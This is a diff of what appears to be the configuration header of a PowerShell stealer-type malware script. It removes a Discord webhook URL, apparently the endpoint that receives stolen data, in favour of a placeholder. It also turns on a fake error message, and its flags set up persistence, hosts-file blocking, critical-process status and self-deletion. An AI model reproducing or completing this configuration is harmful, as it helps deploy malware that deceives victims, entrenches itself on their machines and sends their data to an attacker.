@@ -1,9 +1,9 @@
-$webhook = "https://discord.com/api/webhooks/1237238731677761609/hWwWPvpgh4OiMwyc2178X-mkRtM36A6em7ltfEVztzua2aclLP3ESsmaXNkor4udqe8E" 
+$webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
-$fakeerror = $false
+$fakeerror = $true
 $persistence = $true
 
 $settings = $false
